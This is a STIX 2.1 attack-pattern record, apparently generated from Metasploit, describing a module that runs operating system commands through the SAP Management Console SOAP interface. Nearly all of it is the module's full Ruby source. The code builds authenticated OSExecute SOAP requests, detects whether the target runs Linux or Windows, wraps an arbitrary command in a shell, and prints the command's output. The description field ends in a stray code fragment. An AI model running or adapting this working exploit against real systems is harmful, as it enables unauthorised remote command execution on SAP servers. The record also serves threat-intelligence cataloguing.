{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--47e6e9d3-df62-48bb-8dfc-7c79454b4626",
    "created": "2024-08-14T16:22:29.90374Z",
    "modified": "2024-08-14T16:22:29.903744Z",
    "name": "SAP Management Console OSExecute",
    "description": " This module allows execution of operating system commands through the SAP Management Console SOAP Interface. A valid username and password must be provided.  'References'   => [ # General",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/sap/sap_mgmt_con_osexec.rb",
            "external_id": "sap_mgmt_con_osexec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'SAP Management Console OSExecute',\n      'Description'  => %q{\n        This module allows execution of operating system commands through the SAP\n        Management Console SOAP Interface. A valid username and password must be\n        provided.\n        },\n      'References'   =>\n        [\n          # General\n          [ 'URL', 'http://blog.c22.cc' ]\n        ],\n      'Author'       => [ 'Chris John Riley' ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(50013),\n        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),\n        OptString.new('HttpUsername', [true, 'Username to use', '']),\n        OptString.new('HttpPassword', [true, 'Password to use', '']),\n        OptString.new('CMD', [true, 'Command to run', 'set']),\n      ])\n    register_autofilter_ports([ 50013 ])\n  end\n\n  def run_host(ip)\n    # Check version information to confirm Win/Lin\n\n    soapenv='http://schemas.xmlsoap.org/soap/envelope/'\n    xsi='http://www.w3.org/2001/XMLSchema-instance'\n    xs='http://www.w3.org/2001/XMLSchema'\n    sapsess='http://www.sap.com/webas/630/soap/features/session/'\n    ns1='ns1:GetVersionInfo' # Using GetVersionInfo to enumerate target type\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' +\t soapenv\n    data << '\"  xmlns:xsi=\"' + xsi + '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' +  sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<'+ ns1 + ' xmlns:ns1=\"urn:SAPControl\"></' + ns1 +'>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    print_status(\"[SAP] Attempting to enumerate remote host type\")\n\n    begin\n      res = send_request_raw({\n        'uri'     => normalize_uri(datastore['URI']),\n        'method'  => 'POST',\n        'data'    => data,\n        'headers' =>\n          {\n            'Content-Length'  => data.length,\n            'SOAPAction'      => '\"\"',\n            'Content-Type'    => 'text/xml; charset=UTF-8',\n          }\n      }, 60)\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to communicate\")\n      return :abort\n    end\n\n    if not res\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to connect\")\n      return\n    elsif res.code == 200\n      body = res.body\n      if body.match(/linux/i)\n        print_status(\"[SAP] Linux target detected\")\n        cmd_to_run = '/bin/sh -c ' + datastore['CMD']\n      elsif body.match(/NT/)\n        print_status(\"[SAP] Windows target detected\")\n        cmd_to_run = 'cmd /c ' + datastore['CMD']\n      else\n        print_status(\"[SAP] Unknown target detected, defaulting to *nix syntax\")\n        cmd_to_run = '/bin/sh -c ' + datastore['CMD']\n      end\n    end\n\n    osexecute(ip, cmd_to_run)\n  end\n\n  def osexecute(rhost, cmd_to_run)\n\n    print_status(\"[SAP] Connecting to SAP Management Console SOAP Interface on #{rhost}:#{rport}\")\n    success = false\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xsi = 'http://www.w3.org/2001/XMLSchema-instance'\n    xs = 'http://www.w3.org/2001/XMLSchema'\n    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'\n    ns1 = 'ns1:OSExecute'\n\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\"?>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"' + soapenv + '\"  xmlns:xsi=\"' + xsi\n    data << '\" xmlns:xs=\"' + xs + '\">' + \"\\r\\n\"\n    data << '<SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<sapsess:Session xlmns:sapsess=\"' + sapsess + '\">' + \"\\r\\n\"\n    data << '<enableSession>true</enableSession>' + \"\\r\\n\"\n    data << '</sapsess:Session>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Header>' + \"\\r\\n\"\n    data << '<SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '<' + ns1 + ' xmlns:ns1=\"urn:SAPControl\"><command>' + cmd_to_run\n    data << '</command><async>0</async></' + ns1 + '>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Body>' + \"\\r\\n\"\n    data << '</SOAP-ENV:Envelope>' + \"\\r\\n\\r\\n\"\n\n    user_pass = Rex::Text.encode_base64(datastore['HttpUsername'] + \":\" + datastore['HttpPassword'])\n\n    begin\n      res = send_request_raw({\n        'uri'     => normalize_uri(datastore['URI']),\n        'method'  => 'POST',\n        'data'    => data,\n        'headers' =>\n          {\n            'Content-Length'  => data.length,\n            'SOAPAction'      => '\"\"',\n            'Authorization'   => 'Basic ' + user_pass,\n            'Content-Type'    => 'text/xml; charset=UTF-8',\n          }\n      }, 60)\n\n      if res and res.code == 200\n        success = true\n        body = CGI::unescapeHTML(res.body)\n        if body.match(/<exitcode>(.*)<\\/exitcode>/i)\n          exitcode = $1.to_i\n        end\n        if body.match(/<pid>(.*)<\\/pid>/i)\n          pid = $1.strip\n        end\n        if body.match(/<lines>(.*)<\\/lines>/i)\n          items = body.scan(/<item>(.*?)<\\/item>/i)\n        end\n      elsif res and res.code == 500\n        case res.body\n        when /<faultstring>(.*)<\\/faultstring>/i\n          faultcode = \"#{$1}\"\n          fault = true\n        end\n      else\n        print_error(\"#{rhost}:#{rport} [SAP] Unknown response received\")\n        return\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{rhost}:#{rport} [SAP] Unable to attempt authentication\")\n      return :abort\n    end\n\n    if success\n      if exitcode > 0\n        print_error(\"#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}\")\n      else\n        print_good(\"#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}\")\n      end\n\n      saptbl = Msf::Ui::Console::Table.new(\n        Msf::Ui::Console::Table::Style::Default,\n          'Header'  => '[SAP] OSExecute',\n          'Prefix'  => \"\\n\",\n          'Columns' => [ 'Command output' ]\n        )\n\n      items.each do |output|\n        saptbl << [ output[0] ]\n      end\n\n      print_good(\"#{rhost}:#{rport} [SAP] Command (#{cmd_to_run}) ran as PID: #{pid}\\n#{saptbl.to_s}\")\n\n    elsif fault\n      print_error(\"#{rhost}:#{rport} [SAP] Error code: #{faultcode}\")\n      return\n    else\n      print_error(\"#{rhost}:#{rport} [SAP] failed to run command\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Chris John Riley ]",
        ""
    ]
}